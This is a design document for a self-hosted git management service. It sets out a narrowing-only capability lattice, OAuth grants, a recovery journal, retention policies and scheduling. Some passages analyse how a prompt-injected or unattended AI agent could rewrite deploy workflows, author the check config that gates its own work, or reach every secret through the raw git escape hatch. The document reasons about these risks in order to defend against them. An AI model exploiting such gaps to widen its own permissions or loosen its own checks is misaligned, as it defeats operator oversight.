# Design — SubZeroDev.Git

Designed against `00-brief.md` (ratified 2026-08-03). Where this document decides something
the brief left open, the decision is logged in `90-decisions.md` on the same date. Where it
could not decide, the question is in `## Open questions` rather than assumed away.

**The spine of this design is one idea: a four-layer capability lattice that only ever
narrows.** Build time fixes which operations can exist. Deploy time narrows to what this
instance may do. A declaration narrows to what may be done to one repository. A session
narrows to what one caller may do. Nothing at runtime can widen anything. Every open question
the brief handed to `/design` — build-versus-deploy locking, per-repository narrowing versus
session-level discovery, the escape hatch versus the lock, host-varying tool sets — resolves
to a position on that lattice.

---

## Data model

### Storage kinds

Three, each chosen for a different reason.

| Kind | Holds | Why |
|---|---|---|
| **Structured store** — SQLite on the named volume | Declarations, clone metadata, OAuth clients/grants/tokens, operator credentials, operator sessions, scheduled jobs, operation journal, notification outbox | Transactional. Recovery classification and grant durability both require reading and writing several rows atomically. |
| **Append-only audit log** — JSONL on the volume | One scrubbed line per mutating call and per escape-hatch use | Must survive corruption of the structured store. An audit trail that shares a failure mode with the thing it audits is not an audit trail. |
| **Working clones** — directories on the volume | One git working copy per materialised declaration | They are git repositories; nothing else can represent them. |

Migrations on the structured store are explicit and forward-only, and the store is copied to a
timestamped backup **before** each migration runs. Definition-of-done item 18 requires a tested
rollback to a previous image; a forward-only schema makes that impossible without a
pre-migration copy to restore alongside it.

**Retention, because everything here appends and the lifespan is years.** Twelve things grow
without a natural bound and each gets a stated policy, since the disk-pressure machinery only
knows how to evict clones and would otherwise name innocent declarations as the blockers for
growth that is not theirs.

This list is not the same list as the **five consumers of the volume** the disk-full path reports
— clones, the audit log, the structured store, backups and snapshots, and drop directories.
Retention windows are about unbounded growth; the consumer list is about which *files* hold the
bytes. Most windows live inside one consumer: journal entries, outbox rows, tokens, grants,
operator sessions and terminal jobs are all rows in the structured store, so the store is reported
as one consumer **with a breakdown by table** rather than as several peers. An earlier draft
counted journal and outbox as consumers alongside the store they live in, attributing one file
three ways.

They are stated separately because reconciling them is a mistake, and because a count maintained
by memory drifts — an earlier draft said "four" in prose over an eight-row table and "six" in the
disk-full path.

| What grows | Policy |
|---|---|
| Audit log (JSONL) | Rotated at 64 MB per segment, retained **90 days**, oldest segment removed only after the window passes and only with its chain terminal preserved. Never truncated to make room — a trail that discards itself under pressure is not one. |
| Operation journal | `settled` entries deleted after **30 days**; `attention` entries are never deleted, because they are the ones an operator still has to resolve. |
| Notification outbox | Delivered rows deleted after **14 days**; failed rows retained until the operator clears them from the health view. |
| Pre-migration store backups | The most recent **3** retained, older ones removed after a successful boot on the new schema — the rollback target item 18 needs is the latest one, not all of them. |
| Periodic store snapshots | Taken on the maintenance pass, **daily**, the most recent **7** retained. Distinct in purpose from the pre-migration copy: that one is the rollback target for a bad image, this one is the recovery point for a corrupt store. A store that has not migrated in months would otherwise have no restore point newer than the last upgrade. |
| Operator sessions | Deleted **7 days** after expiry or revocation, on the same window as `Token`s and for the same reason. |
| `failed/` content drops | Retained until the operator clears them, like failed outbox rows. A failed drop is a file someone expected to land and the only copy the service holds; discarding it on a timer would lose it. Surfaced in the health view so it is not retained invisibly. |
| `processed/` content drops | Deleted after **14 days**. The published commit is the durable record by then, so the copy is only useful for tracing a recent delivery. |
| Expired and revoked `Token`s | Deleted **7 days** after expiry or revocation. This is the fastest-growing table in the store and the easiest to miss: a hundred clients refreshing hourly issue on the order of 900,000 rows a year if every issuance persists one. |
| Revoked `Grant`s and `OAuthClient`s | Retained **180 days** after revocation, then deleted. Long enough to answer "what did that client have", short enough not to accumulate for the service's whole life. |
| Terminal `ScheduledJob`s | `done`, `skipped` and `cancelled` deleted after **30 days**; `needs-attention` never. |
| Orphaned `Declaration`s | Retained until the operator removes them with `declaration.remove`. They are few, operator-authored, and the record of what a clone on disk belonged to. |

All twelve windows are configuration with these as defaults, sized against a volume provisioned
generously for the estate: of the order of 100 GB for roughly a dozen declarations, which is
several times the working set.

**Eviction is exceptional at that sizing, and the sizing is a stated premise rather than a
property of the design.** Two watermarks: at **85 %** a maintenance pass is requested, which
applies retention first and evicts safe clones only if that was not enough; at **95 %** operations
needing space are refused. The interlock earns its place at any sizing; what changes with the
estate is how often it trips.

**Notification severity exists because that frequency is not fixed.** The brief states repository
count as unbounded and growing, so a design that assumes eviction stays rare would put routine
housekeeping on the one channel that carries merge conflicts, failed checks and timeouts — and an
operator who mutes that channel loses the 03:00 terminal state along with the noise. Outbox rows
therefore carry a severity: `attention` for a terminal state a caller could not see, `info` for
maintenance. A maintenance pass emits **one `info` summary naming what it released**, not one
notification per clone. The operator routes or suppresses by severity; nothing suppresses
`attention`.

Audit retention and the hash chain have to be reconciled, because "verify end to end" and
"delete the oldest segment" cannot both be unqualified. When a segment ages out, its terminal
hash is written to the structured store as a **retained anchor** before the file is removed, and
verification runs from the oldest surviving anchor forward. Without that, a legitimate retention
delete is indistinguishable from truncation — either boot reports corruption every time retention
runs, or prefix truncation stops being detectable at all.

**Retention runs on the maintenance pass, but each module prunes its own rows.** The pass is a
schedule, not an owner: the lifecycle module drives it with no mutation lock held, calling a
`runRetention()` on each owning module in turn, then asking the clone store to evict if that was
not enough. Every deletion happens inside the module that owns the rows and knows their
invariants — audit writes its retained anchor as it drops a segment, authorization walks the
revocation cascade before deleting a `Grant`. The alternative, one pass reaching into twelve
tables, would put an L1 module in charge of deleting L4's authorization records, which is the
dependency direction the CI check exists to catch.

Every window that prunes automatically has an owner that does the pruning. Two do not prune at
all — orphaned declarations and `failed/` drops are cleared by the operator, deliberately, because
both are the only copy of something someone expected to keep:

| Owner | Prunes |
|---|---|
| Audit | Log segments, writing the retained anchor first |
| Journal | Settled entries |
| Authorization | Expired and revoked tokens, revoked grants and clients |
| Notifier | Delivered outbox rows |
| Operator identity | Expired and revoked operator sessions |
| Scheduler | Terminal jobs |
| Structured store | Its own pre-migration copies and daily snapshots |
| Watcher | `processed/` drops |
| Clone store | Evicts clones, and only if the above was not enough |

**Store retention ends with a compaction step, because deleting rows does not free disk.** SQLite
returns freed pages to its own freelist rather than to the filesystem, so a pass that deleted a
year of expired tokens would report success, free nothing on the volume, and escalate to evicting
clones — naming innocent declarations as the blockers for growth that was never theirs, which is
the exact failure the consumer breakdown exists to prevent. The store therefore runs an
incremental vacuum after its own deletes and reports what was actually returned. Auto-vacuum was
the alternative and is rejected: it must be chosen before any data exists and it costs write
amplification on every transaction for the life of the service, to solve a problem that occurs on
a scheduled pass.

The disk-full path reports which of the **five consumers of the volume** is taking the space, with
the store broken down by table. The store was missing from that list entirely in an earlier draft,
which is precisely the case where eviction frees nothing and the refusal blames innocent
declarations.

**Volume loss is an accepted risk, not a covered one.** Two store copies exist and neither changes
that: the pre-migration copy is the rollback target for a bad image, and the daily snapshot is the
recovery point for a corrupt store. **Both are on the same volume and protect nothing against
losing it.** No off-volume backup operation ships. What losing the volume costs, written down so
the decision is a decision rather than a discovery:

| Lost | Recovery |
|---|---|
| Working clones | Re-cloned from their remotes. Unpushed work in a clone is gone — the one genuinely unrecoverable case. |
| Declarations | Re-declared by hand. They are small and operator-authored, but there is no export today. |
| OAuth clients, grants, tokens | Gone. Every MCP client re-authorises, which is a visible outage for unattended agents rather than a silent one. |
| Audit log | Gone, and the hash chain cannot help — a chain proves a surviving trail was not edited, not that a destroyed one existed. |
| Journal | Gone. Any operation in flight at the moment of loss is unclassifiable. |

The mitigations that are actually load-bearing here are external: whatever the host does with the
volume, and the fact that clones are replicas of remotes rather than originals. Revisit if the
audit trail ever needs to survive the instance — that is the same requirement the deferred
external sink would satisfy, and the two should be answered together rather than separately.

### Entities

#### `Declaration` — a managed repository

Operator-owned authority. Persisted. Identity is `id`, chosen by the operator, immutable.

| Field | Type | Notes |
|---|---|---|
| `id` | string, `^[a-z0-9][a-z0-9-]{0,62}$` | Identity. Appears in the MCP resource URI and every API path, so it is URL-safe by validation rather than by escaping. Renaming is delete-then-create. |
| `generation` | integer, from 1 | Incremented each time this `id` is re-declared after being orphaned. **The id alone is not an identity** — `(id, generation)` is. Stamped onto every journal entry, clone record, grant and audit line, so records from a previous era can never be mistaken for this one's. |
| `cloneUrl` | string | Operator intent. Its host must be on the deployment's remote-host allowlist. |
| `host` | `github` \| `generic` | Determines which host capabilities the grant may contain. `generic` gets local git only. |
| `credentialRef` | string | A *name*, never a value: `^[a-z0-9][a-z0-9._-]{0,63}$`, matching a file name in the secrets mount. Resolved at point of use. Carries its own allowed-host constraint. |
| `capabilityGrant` | set of capability names | The per-repository layer of the lattice. Must be a subset of the deployment ceiling at write time. |
| `writablePathPrefixes` | string[] | Path allowlist for every write against this repository. Operator-side, because this is authority and not a repository fact. **The ceiling, not the effective set** — see the actor intersection below. |
| `pinned` | boolean | When true the clone is never evictable. |
| `contentDrop` | `{ tool, autoMerge }`? | Absent by default. When present, the watcher observes this declaration's drop directory and dispatches `tool`, which **must name a registry tool annotated as a drop target** — see `ContentDrop`. |
| `identity` | `{ gitUserName, gitUserEmail }` | Commit author for operations this service performs. |
| `state` | `active` \| `orphaned` | Deleting a declaration marks it `orphaned` and leaves the clone alone. |
| `createdAt`, `updatedAt` | ISO 8601 UTC | |

Mutable at runtime by the operator, which is what makes definition-of-done item 5 — onboarding
by declaration alone, no restart — reachable at all.

**The effective write allowlist is the declaration's set intersected with the acting profile's**,
on the same narrowing-only principle as the capability lattice. The declaration states the ceiling
for a repository; the actor profile states what that kind of caller may write anywhere. The
operator profile is unrestricted, so its effective set is the declaration's; the `scheduler`,
`mcp` and `watcher` profiles strip `.github/workflows/`, `.config/`, `tools/` and `build/`. No
layer can add a prefix.

This is the prior art's rule that **unattended actors must not be able to unlock themselves**, and
it is inherited rather than invented: `blog-mcp`'s cron and watcher profiles carry exactly that
strip list. Without it a single field would govern every actor, and a scheduled job or an injected
agent would hold the operator's write surface — including the deploy workflow that decides what a
merge does and the repository config that decides what "green" means. It does not close the
`RepositoryConfig` exposure recorded below, which is about a caller authoring its own gate and
remains knowingly accepted; it does keep the two unattended profiles out of it.

Re-declaring an `id` whose orphaned clone points at a different remote is refused. **So is
re-declaring one whose orphaned clone is not clean.** The adopting declaration inherits a
directory, and a directory carries state that no capability check ever saw: uncommitted edits
under a path the new grant does not permit, a branch ahead of its upstream, a stash, or a journal
entry left unsettled by the previous era. Adoption therefore runs the same predicate eviction
uses, across **every** generation rather than the current one, and refuses with a `precondition`
naming what blocks it.

Without that check the two rules meet badly: the clone is deliberately shared across generations,
while recovery selects journal entries by `(declarationId, generation)` — so a previous era's
unsettled entry cannot match, the clone derives as `ready` rather than `recovery-pending`, and the
new declaration serves mutations over a tree holding half-applied work its grant never admitted.
The next commit and push would carry it. `generation` exists to make "re-declaring inherits
nothing" enforceable; the clone directory is the one thing it does not cover, so the refusal
covers it instead.

Removing an orphaned declaration and removing its clone are two operations, both under
`declaration.manage`, both console-only, both audited:

- **`clone.remove`** deletes the directory. It refuses unless the clone is safe to release, by the
  same predicate. An explicitly flagged override permits a **corrupt** tree — one where
  `rev-parse --git-dir` fails, so the predicate cannot be computed at all — and still refuses when
  the tree holds commits unreachable from `origin/<base>`. Without the override a corrupt clone is
  unevictable, unremovable and permanently blocking, with no exit short of host access.

  **It never becomes a way to discard unpushed work**, which is why orphaned declarations stay
  operable above. The refusal and the remedy would otherwise share one predicate: work too
  valuable to evict is work too valuable to remove, and the operator would be left with a
  repository that can be neither reused nor released. Making the work pushable is the exit;
  making it discardable is not.
- **`declaration.remove`** deletes an orphaned declaration record, and refuses while a clone for
  it remains. Its history in the audit log is unaffected; the retention window above is what
  eventually clears that.

**Orphaning is detachment, not removal, so every subsystem keyed by `declarationId` needs a
stated answer.** Without one, each invents its own and the ghost declaration keeps being acted
on in four different ways.

| Dependent | On orphaning |
|---|---|
| Clone | Left on disk, untouched, and becomes evictable under the ordinary safety interlock. |
| Servability | **Reads and the typed write and push tools remain available to the operator console** under `declaration.manage`. Orphaning withdraws a repository from ordinary service; it does not strand whatever is still in its tree. Without this the clone is unreachable from every surface, and an orphan holding an unpushed branch is refused adoption *and* refused removal by the same predicate — a dead end whose only exit is host access. The exit is now: push the outstanding work, then `clone.remove`, then `declaration.remove`. |
| Pending `ScheduledJob`s | Moved to `cancelled` with a reason naming the orphaning. Not fired, and not silently dropped. |
| `Grant`s and `Token`s whose resource is `/mcp/{id}` | Revoked, and the declaration's `grantEpoch` bumped, so live sessions bound to it close on their next call rather than continuing against a repository the operator has retired. |
| Unsettled journal entries | Retained and reported. They are the record of work that may still be in the clone. |
| Content drop directory | Watching stops immediately; the directory is left on disk untouched. Files still in the inbox are neither applied nor moved, because there is no longer a declaration to apply them to. `declaration.remove` refuses while the directory holds anything, on the same principle as `clone.remove` — a dropped file the service accepted is a copy nobody else may hold. |

**Re-declaring the same `id` does not inherit any of it, and `generation` is what makes that
enforceable rather than asserted.** The new declaration takes the next generation, starts with a
fresh `grantEpoch` and no authorization records, and recovery selects journal entries by
`(declarationId, generation)` — so an unsettled entry from the previous era is not a candidate,
because it does not match, rather than because something remembered to exclude it. The same key
governs which clone metadata, grants and audit lines belong to which era.

The clone directory is the one thing that is *deliberately* shared across generations: it is
left on disk by orphaning and adopted by the new declaration when the remote matches **and the
tree is clean**, which is why re-declaring an `id` whose orphaned clone points elsewhere or holds
work is refused. Its metadata record carries the current generation; the tree it describes may
predate it, which is exactly why adoption is gated rather than automatic.

#### `RepositoryConfig` — repository-supplied facts

**Derived, read at point of use, never cached and never persisted as truth.** Read from a file in
the target repository's working tree, generalising `.config/blog.json`.

| Field | Type | Source |
|---|---|---|
| `baseBranch` | string | repository, default `main` |
| `requiredChecks` | string[] | repository |
| `deployWorkflow` | string | repository |
| `branchPrefixes` | string[] | repository |

**Read from the working tree**, as `blog-mcp`'s `loadConfig(repoRoot)` does, so the file can
differ per branch — and **read fresh on every operation that needs it**, with no cache.

A cache here has to be keyed by something that changes whenever the file's content does, and
`HEAD` is not that: the config is read from the working tree, so an uncommitted edit leaves `HEAD`
where it was. That is not a corner case but the case this design already documents as its accepted
exposure below — a caller authoring the configuration its own call will read. Correctness would
then rest on every mutating path invalidating by hand, including `git.raw`, whose whole premise is
that its effects are not anticipated. The cache is dropped instead. What it saves is one small
JSON read from a local disk, in operations that already fork a git subprocess; the resolver for
credentials resolves at point of use for the same reason, and this is the same rule applied to the
other repository-supplied input.

**Known and retained, not overlooked:** the tree of a long-lived clone is wherever the last
operation parked it, including a branch the calling agent created moments ago, so a caller with
`git.local.write` can author the configuration read for its own call. `requiredChecks` is the
field where that bites, because it defines what "green" means to the unwatched flow of
definition-of-done item 13. Two guards were proposed and declined when the brief was
ratified — reading from `origin/<base>`, and excluding the config path from
`writablePathPrefixes` — and both remain declined; `90-decisions.md` holds the entry, the reasons
and the condition that reopens it. Neither guard is in this design, and the exposure is accepted
knowingly rather than mitigated quietly.

Nothing here grants authority. The invariant that makes this safe is stated once, here, and is
checkable: **any field a caller could set that widens what the service will do lives in the
`Declaration`, not in `RepositoryConfig`.** The brief records the same rule and the condition
under which it must be revisited; `/contract` verifies no permission-shaped field has drifted
into the repository-side format.

A missing config file is not an error — every field defaults, and a declaration with no config
file at all is fully operable. That is what keeps the format from encoding `SubZeroDev.*`
habits.

#### Credential resolution — a mounted secrets directory

A read-only mount whose **file names are reference names**. `Declaration.credentialRef` names a
file; the resolver reads it at the moment of use and passes the value into a child process's
environment by name, never returning it to a handler. Nothing else in the design touches a secret
value.

**How a secret becomes authentication, since git does not read one from a bare variable.** Exec
supplies the credential channel itself, as command-line configuration ahead of any caller
argument: the helper is cleared and then set to a service-owned one that reads the resolved
variable. The distinction that matters throughout this design is therefore not that git runs
without configuration — it cannot fetch or push that way — but that **the only configuration git
sees is the service's own**. System and global configuration are disabled, the home directory is
neutral, the repository's own config is covered by the subcommand refusals in The escape hatch's
residual risk, and an argument vector that tries to inject configuration is rejected before the
process starts. Caller-supplied and repository-supplied configuration are what is excluded;
service-supplied configuration is the mechanism.

Three properties follow, and they are why this resolver ships rather than the alternatives:

- **No restart to onboard.** A new declaration names a new file, and the file is already there or
  is dropped in without touching the container. Definition-of-done item 5 fails outright if
  credentials come from the container environment.
- **No secret in the structured store**, so the pre-migration backups the rollback path depends on
  carry none either. Backup handling does not inherit secret handling.
- **Rotation is a file write.** The resolver reads at point of use, so a replaced file takes
  effect on the next operation — which is what lets a failing credential reference clear itself
  rather than waiting for a restart.

**Stated plainly, because it bounds what per-declaration isolation means:** every reference in the
mount is readable by the service, so code reached through `git.raw` can read all of them. The
brief already defers whether isolation is ever an enforced boundary and claims only that a
credential is not *given* to an operation outside its declaration. This resolver keeps that claim
and does not strengthen it. An external secret store with per-reference access control is the
option that would, and it is not shipped.

#### `Clone` — a materialised working copy

Metadata persisted in the structured store; the tree itself is a directory.

| Field | Type | Derived? |
|---|---|---|
| `declarationId` | string | identity, 1:1 with `Declaration` |
| `generation` | integer | the era of the declaration currently holding this clone. The tree may predate it; adoption is what advances the field, and adoption is refused unless the tree is clean |
| `state` | `absent` \| `materialising` \| `ready` \| `dirty` \| `recovery-pending` \| `needs-attention` \| `evicted` | derived from disk at boot, then maintained. `recovery-pending` means unsettled journal entries exist and lazy recovery has not reached this declaration yet; it serves reads and refuses mutations |
| `path` | string | derived from `declarationId` |
| `sizeBytes` | number | derived, refreshed after each mutation |
| `lastOperationAt` | ISO 8601 UTC | eviction ordering key |
| `observedRemote` | string | read from the clone; cross-checked against `Declaration.cloneUrl` at every materialisation |
| `safeToEvict` | boolean | **derived, never stored** — recomputed at eviction time only |
| `attentionReason` | string? | set when recovery could not classify, or when the tree is dirty from outside. A clone in `needs-attention` refuses ordinary mutations and still admits the repair session described under the parked-operations view |

`state` is authoritative in memory and re-derived from disk at boot. Persisting it is a
convenience for reporting, not a source of truth: an unclean kill can make the stored value a
lie, and boot must not trust it.

#### `CapabilityProfile` and the lattice

Capabilities are the single vocabulary for "may this happen". Four layers, each a subset of the
one above:

1. **Contract set** — every capability named by any tool in the compiled registry. Fixed at
   image build, covered by the contract fingerprint.
2. **Deployment ceiling** — configured per deployment. Startup is fatal if it names a capability
   the contract set does not contain.
3. **Declaration grant** — `Declaration.capabilityGrant`, intersected with the host-supported
   set implied by `Declaration.host`. Writing a grant outside the ceiling is refused.
4. **Session grant** — the actor profile (operator console, MCP client, scheduler, watcher)
   intersected with the OAuth scopes actually granted.

The effective set for a call is the intersection of every layer that applies to it — all four for
a declaration-scoped capability, and layers 1, 2 and 4 for an instance-scoped one, which has no
declaration to intersect against. There is no operation anywhere that adds a capability to a set.

**Capabilities are typed by what they are an operation *on*.** A **declaration-scoped** capability
authorises an operation against one repository and intersects all four layers. An
**instance-scoped** one authorises an operation on the service itself, has no declaration to
intersect against, and therefore intersects layers 1, 2 and 4 only — taking its target, where it
has one, as a parameter. Without that distinction the intersection is not merely imprecise but
wrong: amending a declaration would require that declaration to have pre-granted
`declaration.manage`, and repairing a parked clone would require it to have pre-granted its own
repair, so a declaration could put itself permanently beyond management.

| Capability | Scope | Covers |
|---|---|---|
| `repo.read` | declaration | status, log, branches, health, diff |
| `git.local.write` | declaration | branch preparation, stage, commit, restore-paths |
| `git.remote.write` | declaration | push, fetch, base-sync. **Separate from `git.local.write` on purpose**, so a profile can write locally without reaching a remote — the distinction `blog-mcp`'s `remote` flag already draws, and what lets an unattended actor commit without publishing. Git-level rather than host-level, so a `generic` declaration can hold it: local git works against any host |
| `git.raw` | declaration | the escape hatch. In the deployment ceiling and reachable from MCP sessions; **default-deny at the declaration layer**, so a repository has it only when its `capabilityGrant` names it |
| `host.pr.read` | declaration | PR status, list, comments |
| `host.pr.write` | declaration | create PR, enable auto-merge, reconcile after merge |
| `host.checks.read` | declaration | check status, bounded waits, deploy status, published-URL verification |
| `scheduler.manage` | declaration | create, list, cancel held operations |
| `content.*` | declaration | reserved for consumer domains; the blog consumer adds its own under this prefix |
| `declaration.manage` | **instance** | declare, amend, orphan a repository; remove an orphaned declaration; remove a clone; operate an orphaned declaration's clone to get work out of it |
| `auth.manage` | **instance** | list and revoke OAuth clients, grants, operator API tokens and live sessions |
| `audit.read` | **instance** | read the audit trail and its chain-verification state |
| `attention.resolve` | **instance** | inspect a parked journal entry, drive the repair session, resolve it, return a clone to `ready` |

`host.*` capabilities are only ever present in a grant when `Declaration.host` supports them.
That is how a per-declaration tool set varies by host without the contract varying by
declaration: the tool exists in every image and simply has no session that can reach it for a
`generic` declaration.

Scopes stay orthogonal and coarse — `read`, `write`, `raw`, `schedule` — because the OAuth
resource indicator already carries the repository. Scopes are what the resource owner granted;
capabilities are what the server side enabled; both must permit the call.

#### `Session`

| Field | Type | Notes |
|---|---|---|
| `id` | string | |
| `kind` | `operator` \| `mcp` \| `scheduler` \| `watcher` | |
| `actorRef` | `{ kind, subject, clientId? }` | Passed by value into every context. Audit and journal never import the authorization module — see Module boundaries. |
| `repositoryBinding` | string? | **Set for `mcp` and `watcher`, absent for `operator`.** A `scheduler` session binds per job rather than per session. |
| `grant` | set of capability names | Layer 4, computed at session establishment and frozen for the session's lifetime — frozen against *widening*. See the grant epoch for how a narrowing still reaches a live session. |
| `writablePathPrefixes` | string[] | The **actor profile's** set, intersected per call with the declaration's. Unrestricted for `operator`; strips `.github/workflows/`, `.config/`, `tools/` and `build/` for `mcp`, `scheduler` and `watcher`. |
| `frozenAtEpoch` | number | The declaration's `grantEpoch` when the grant was computed. Compared on every dispatch. |

**Operator sessions are persisted; MCP sessions are not.** An `OperatorSession` row carries id,
subject, `createdAt`, `lastSeenAt`, an idle expiry, an absolute expiry and `revokedAt`. Two stated
behaviours require it and neither works from process memory: an explicit logout that invalidates
server-side rather than only clearing the cookie, and revocation of another session from the
grants view during an incident. It also decides a question that would otherwise be silent — a
console session survives a restart, on the same reasoning that made OAuth grants durable. MCP
sessions stay in memory because their durability lives in the `Grant` and refresh `Token` that
re-establish them.

An MCP session binds to exactly one repository at `initialize`, because the MCP resource
indicator *is* the repository: the canonical URI is `/mcp/{declarationId}`. That is what lets
capability filtering affect **discovery as well as dispatch**, which the prior art requires and
which a repository-agnostic session cannot deliver. An operator session spans every
declaration, because the console has to aggregate across them.

Freezing the grant at session establishment inherits the prior art's rule that a token tier is
fixed at `initialize` for the session's lifetime.

#### `OAuthClient`, `Grant`, `Token` — the authorization records

Durable grants are definition-of-done item 12's headline departure from the prior art, and item
20 requires revocation to be documented — which requires it to exist. All three are persisted in
the structured store.

| Entity | Identity | Notes |
|---|---|---|
| `OAuthClient` | `clientId` | Dynamically registered. Redirect URIs, registration time, `revokedAt`. |
| `Grant` | `grantId` | `kind` (`mcp` \| `operator-api`), `clientId`, subject, `resource`, `generation`, granted scopes, `createdAt`, `lastUsedAt`, `revokedAt`. Durable, so a client reconnects after a restart without re-authorising. For an `mcp` grant the resource is the `/mcp/{declarationId}` URI and `generation` records the declaration era it was issued against; for an `operator-api` grant there is no declaration, so both are null. |
| `Token` | `jti` | `grantId`, `kind` (`access` \| `refresh`), `expiresAt`, `revokedAt`, and **`verifierHash`** — a salted hash of the token value. Access tokens are short-lived; refresh tokens are durable, which is the half of item 12 that survives a restart. |

**Tokens are opaque and verified by stored hash, not signed.** A record holding only `jti` and
expiry cannot authenticate anything: after a restart the client presents a bearer string, and
without a verifier there is nothing to check it against, so item 12's reconnection would fail or
the service would have to accept a token it cannot validate. The value is high-entropy random,
issued once, stored only as a salted hash, and compared in constant time.

Signed tokens were the alternative and are rejected here: a JWT buys stateless verification this
design never needs — one issuer, one resource server, one process — and it costs a signing-key
lifecycle, rotation, and a revocation story that has to reach tokens already in the wild. With
opaque tokens, revocation is the store lookup that already happens on every call, so the
revocation model above stays exactly one mechanism rather than two.

Three rules govern them:

- **Revocation is a timestamp, never a delete.** A store that forgets what was revoked cannot
  answer the question the revocation was raised to answer.
- **Cascade is evaluated at check time, not written as a batch.** A revoked client's grants and a
  revoked grant's tokens are dead because the check walks upward, so there is no partially
  applied cascade to recover from.
- **A revoked grant's resource is released, but its history is not.** Orphaning a declaration
  revokes every grant whose resource names it — see the orphaning cascade.
- **Revocation reaches queued work, not only live sessions.** A revoked grant's pending scheduled
  jobs are checked at fire time, not cancelled in a batch, on the same check-time principle — see
  `ScheduledJob`. Without that, revoking a compromised client would stop its sessions and leave
  its queue to fire hours later under a grant frozen before the revocation, which is precisely the
  actor that runs unwatched.

**An `operator-api` grant is how the HTTP API is reached without a browser.** The brief names the
API as a first-class surface the operator drives directly, and a cookie session with an enforced
TOTP login is not a credential a script can hold. The token is issued from the grants view, is the
same opaque high-entropy value verified by the same stored hash, and is listed and revoked
alongside MCP grants. It carries operator scopes and no repository binding, because the API's
repository dimension is in the route rather than in a resource indicator.

**The grant epoch — how a frozen session still narrows.** Freezing at establishment is what makes
"nothing at runtime widens" true, and on its own it also means nothing narrows: an operator
watching an agent misbehave could remove a capability and watch the live session keep using it.
Both properties are wanted, so the freeze is kept and a version counter is added. Every
declaration carries a `grantEpoch`, incremented on any change to `capabilityGrant`, on orphaning,
and on any revocation naming that resource. A session records the epoch it froze at; dispatch
compares before invoking a handler. If the epoch has moved the session recomputes its grant, and
because that computation is an intersection of four layers it can only ever narrow — a widened
declaration grant does not reach a live session, while a narrowed one takes effect on the very
next call. A call the recomputed grant no longer admits returns `authorization`. If the grant or
its client was revoked outright, the session is closed and the transport answers `401` with the
resource-metadata challenge, because the caller now needs to re-authorise rather than retry.

Revocation is reachable only from the console, under `auth.manage`, for the same structural
reason declaration management is: an MCP session is bound to one repository and revoking the
authority of *other* sessions is not an operation on that repository.

#### `OperationJournalEntry` — the recovery record

Written **before the first side effect** of a mutating operation. This is the material
departure from the prior art that definition-of-done item 14 demands: nothing recovers from an
interruption whose intent was never recorded.

| Field | Type | Notes |
|---|---|---|
| `operationId` | string | identity |
| `declarationId`, `generation` | string, integer | Both. Recovery selects on the pair, so an entry from a previous era of the same id never matches. |
| `tool` | string | registry name |
| `input` | JSON | scrubbed |
| `actorRef` | `{ kind, subject, clientId? }` | |
| `scheduledJobId` | string? | Set by the pipeline when the call context carries one, so a scheduled job's journal entry is findable by the job that caused it. See `ScheduledJob` for why the correlation points this way and not the other. |
| `context` | `normal` \| `repair` \| `recovery` \| `hatch` | What kind of action this was, not just which tool. Mirrors `AuditEntry.context`. |
| `preState` | `{ branch, headSha, upstreamSha, indexDigest, worktreeDigest }` | Captured under the lock, before acting. **Digests, not booleans.** `indexDigest` hashes the index's own entries — path, mode, blob id and stage number — rather than the tree they would write; `worktreeDigest` covers tracked paths that differ from the index, plus the untracked set. |
| `steps` | array of `{ name, state, at }` | composites journal each sub-step, and **every operation that mutates anything outside the local clone journals a step marked `applied` before the call that does it** — see below |
| `state` | `intended` \| `applied` \| `settled` \| `attention` | |
| `startedAt`, `updatedAt` | ISO 8601 UTC | |

`settled` means the outcome has been observed and reported. Any entry not `settled` at boot is
a recovery candidate.

**Why digests rather than clean/dirty flags.** Booleans cannot represent the case recovery most
needs to classify. An operation that begins against an already-dirty tree, changes one path, and
crashes leaves `indexClean` and `treeClean` exactly as they were — so a comparison against them
concludes that nothing happened and marks the entry `settled`, silently converting a real side
effect into a non-event. That is the opposite of what definition-of-done item 14 asks for, and it
fails most often on a long-lived clone, which is usually dirty. Digests change whenever the
content changes, so "pre-state matches" means what it says. The cost is a tree hash before every
mutation, which git computes cheaply and which the operation is about to do anyway.

**Why the index is digested rather than the tree it would write.** Producing that tree means
`git write-tree`, which has two properties this field cannot afford: it writes objects into the
object database, so pre-state capture would itself be a side effect taken before the record whose
whole purpose is to precede the first one; and it fails outright on an unmerged index. That second
one is the worse of the two. A declaration left with a conflicted index could then never capture
pre-state, so the journal's intent write would fail, so per the boundary table every mutating tool
would abort — permanently, on the one declaration that most needs an operator to reach it. Hashing
the index entries has neither problem: nothing is written, and conflict stages are just part of
what is hashed, so an unmerged index is a value rather than an error.

**A host-side mutation must be journalled as a step, because pre-state cannot see it.** Every
field in `preState` is local. A `push` that the remote accepted, or a `gh` call that created a
pull request, leaves the branch, `HEAD`, the index and the worktree exactly as they were if the
process dies before the local remote-tracking ref is updated — so pre-state matches perfectly.
Recovery's first branch would then read "nothing happened" and settle the entry, converting a
completed remote mutation into a recorded non-event: a retried `create_pr` opens a second pull
request, a retried `auto_merge` is issued against something already merged, and the operator is
told the operation never started.

The `steps` guard is what closes it, and only if every host mutation uses it — not composites
alone. The step is written and marked `applied` **before** the network call, so an interruption
anywhere after that point fails the "no step is `applied`" condition, falls through to the
"neither matches" branch, and parks as `attention`. That is the honest outcome: the service does
not know what the remote did, and says so.

With that in place the residual limit is narrower and real. `git.raw` can do things no post-state
predicate anticipates, so it parks; and a step marked `applied` whose call in fact never left the
process parks too, which errs toward operator attention rather than toward a silent settle.

#### `ScheduledJob` — generalised hold-and-act

The publish-shaped scheduler becomes an operation-shaped one — a redesign rather than a move.

| Field | Type | Notes |
|---|---|---|
| `id` | string | identity |
| `declarationId` | string | |
| `tool` | string | **must name a tool in the compiled registry annotated schedulable** |
| `input` | JSON | validated against that tool's input schema at creation **and again at fire time**, because the scheduler dispatches through the same pipeline as everyone else and the registry can change under a pending job. Boot re-validates pending jobs too — see the boot path |
| `notBefore` | ISO 8601 UTC | |
| `onMissed` | `{ mode: 'catch_up' }` \| `{ mode: 'skip_if_older_than', seconds }` | explicit per job, never an implicit default — inherited whole |
| `frozenGrant` | set of capability names | the creator's effective set, captured at creation |
| `status` | `pending` \| `running` \| `done` \| `skipped` \| `cancelled` \| `needs-attention` | |
